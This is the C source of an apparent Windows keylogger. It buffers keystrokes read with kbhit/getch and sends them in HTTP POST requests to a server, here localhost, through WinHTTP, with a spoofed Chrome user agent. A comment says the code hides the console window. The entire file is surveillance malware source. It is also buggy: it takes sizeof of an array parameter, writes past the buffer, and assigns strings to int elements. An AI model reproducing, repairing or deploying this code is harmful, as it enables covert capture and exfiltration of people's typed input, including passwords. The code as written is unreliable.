#include <stdio.h>
#include <Windows.h>
#include <Winhttp.h>

#pragma comment(lib, "winhttp.lib")
#define N 32

int sendCapture(int capture[]) {
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	printf("%d", sizeof(capture));

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 96.0.4664.45 Safari / 537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, L"localhost",
            INTERNET_DEFAULT_HTTP_PORT, 0);

    // Create an HTTP Request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"POST",
			L"/",
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			0);

	LPCWSTR additionalHeaders = L"Content-Type: text/plain\r\n";
	DWORD headersLength = -1;

	// Send a Request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			additionalHeaders,
			headersLength, capture, N * sizeof(capture),
			N * sizeof(capture), 0);

	// Report any errors.
	if (!bResults)
		printf("Error %d has occurred.\n", GetLastError());

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return 1;
}

int main(void) {
	int capture[N], key, l = 0;

	// Hide window
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 1);

	while (1) {
		Sleep(20);
		if (kbhit()) {
			key = getch();

			if (l == N) {
				capture[l + 1] = "\0";
				sendCapture(capture);

				capture[0] = "\0";
				l = 0;
			}

			if (l < N) {
				capture[l] = key;
				printf("%d ", l);
				l++;
			}
		}
	}

	return 1;
}